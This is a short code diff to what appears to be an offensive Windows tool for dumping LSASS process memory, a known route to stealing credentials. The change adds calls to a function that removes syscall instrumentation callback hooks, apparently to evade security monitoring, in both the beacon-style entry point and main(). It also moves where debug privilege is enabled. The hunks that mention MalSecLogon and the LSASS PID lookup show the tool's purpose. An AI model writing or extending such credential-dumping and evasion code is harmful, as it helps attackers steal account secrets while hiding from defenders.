@@ -49,9 +49,7 @@ void go(char* args, int length)
             return;
     }
 
-    success = enable_debug_priv();
-    if (!success)
-        return;
+    remove_syscall_callback_hook();
 
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
@@ -70,6 +68,10 @@ void go(char* args, int length)
         PRINT(LSASS " PID: %ld", lsass_pid);
         return;
     }
+
+    success = enable_debug_priv();
+    if (!success)
+        return;
 
     BOOL use_malseclogon_remotely = use_malseclogon && duplicate_handle;
     BOOL use_malseclogon_locally = use_malseclogon && !duplicate_handle;
@@ -429,6 +431,8 @@ int main(int argc, char* argv[])
         PRINT("The options --fork and --snapshot cannot be used at the same time");
         return -1;
     }
+
+    remove_syscall_callback_hook();
 
     // if not provided, get the PID of LSASS
     if (!lsass_pid)
